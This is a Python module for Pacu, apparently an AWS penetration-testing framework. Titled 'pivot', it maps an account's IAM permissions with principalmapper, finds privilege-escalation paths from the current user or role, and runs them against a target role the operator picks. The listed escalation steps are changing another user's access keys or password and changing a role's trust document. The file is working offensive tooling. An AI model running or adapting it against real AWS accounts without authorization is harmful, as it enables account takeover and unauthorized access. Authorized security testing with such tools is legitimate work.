#!/usr/bin/env python3
import argparse
import collections
import functools
import os
import sys

import botocore
import mypy_boto3_sts

import boto3

import principalmapper.common
from principalmapper.graphing import graph_actions
from principalmapper.querying.query_utils import get_search_list
from principalmapper.graphing import gathering
from principalmapper.common.edges import Escalation, Edge
from principalmapper.graphing.edge_checker import EscalationChecker
from principalmapper.common import Node, Group, Policy, Graph

from modules.iam__pivot_v2 import lib

module_info = {
    'name': 'pivot',
    'author': 'Ryan Gerstenkorn',
    'category': 'ESCALATE',
    'one_liner': 'Pivots current user based on IAM data.',
    'description': 'Updates aws_key info based on existing data found through other modules. Currently this looks for '
                   'roles that can be assumed and allows you to pivot to them for the current user.',
    'services': ['IAM'],
}

# Every module must include an ArgumentParser named "parser", even if it
# doesn't use any additional arguments.
parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--rebuild-db', required=False, default=False, action='store_true',
                    help='Rebuild db used in this module, this will not affect other modules. This is needed to pick '
                         'up new or changed permissions.')


class IamEscalationChecker(EscalationChecker):
    def user_escalations(self):
        return [
            lib.change_user_access_keys,
            lib.change_user_password,
            lib.change_role_trust_doc
        ]


    def role_escalations(self):
        return [lib.change_role_trust_doc]

def main(args, pacu_main):
    session = pacu_main.get_active_session()
    print = pacu_main.print
    input = pacu_main.input
    user = pacu_main.key_info()
    aws_sess = pacu_main.get_boto3_session()
    fetch_data = pacu_main.fetch_data

    #pacu_main.api_recorder.playback()

    principalmapper.graphing.gathering.edge_identification.checker_map = checker_map

    graph_path = os.path.abspath("./sessions/{}/pmapper".format(session.name))
    os.makedirs(graph_path, 0o0700, True)
    try:
        graph = graph_actions.get_graph_from_disk(graph_path)
        graph.store_graph_as_json(graph_path)
    except FileNotFoundError as e:
        graph = graph_actions.create_new_graph(session=aws_sess._session, service_list=['iam'], debug=True)
        graph.store_graph_as_json(graph_path)

    # graph = graph_actions.create_new_graph(session=aws_sess._session, service_list=['iam'], debug=True)
    # graph.store_graph_as_json(graph_path)
    # graph.edges = graph_actions.gathering.edge_identification.obtain_edges(aws_sess, ['iam'], graph.nodes, sys.stdout, debug=True)

    graph.store_graph_as_json(graph_path)

    source_node = get_current_node(graph, user)
    data = collections.OrderedDict()
    for edge_list in get_search_list(graph, source_node):
        data[edge_list[-1]] = edge_list

    if not data:
        return False

    target = ask_for_target(data, input, print)

    for edge in data[target]:
        edge: Escalation
        edge.run(pacu_main, print, input, fetch_data)

    return target.destination


checker_map = {
    'iam': IamEscalationChecker,
    # 'lambda': LambdaEdgeChecker,
    # 'ssm': SSMEdgeChecker,
    # 'sts': STSEdgeChecker
}

def summary(data, pacu_main):
    if not data:
        return "No assumable roles found"
    return "KeyAlias: {} RoleArn: {}".format(pacu_main.key_info()["KeyAlias"], data.arn)


def sess_from_h(user) -> boto3.session.Session:
    return boto3.session.Session(aws_access_key_id=user['AccessKeyId'], aws_secret_access_key=user['SecretAccessKey'],
                                 aws_session_token=user['SessionToken'])

def get_current_node(graph: Graph, user):
    if user["UserName"]:
        source_name = 'user/{}'.format(user["UserName"])
    elif user["RoleName"]:
        source_name = 'role/{}'.format(user["RoleName"])
    else:
        raise UserWarning("No current user or role found")

    return graph.get_node_by_searchable_name(source_name)

def ask_for_target(data, input, print):
    keys = list(data.keys())
    item = 1
    for target, edge_list in data.items():
        print("    ({}) {}".format(item, target.destination.searchable_name()))
        for edge in edge_list:
            print("          * {} -> {} -> {}".format(edge.source.arn, edge.reason, edge.destination.arn))
        print("          * {} is the target".format(edge.destination.arn))
        item += 1
    response = int(input("Choose role to assume: "))
    target = keys[response - 1]
    return target
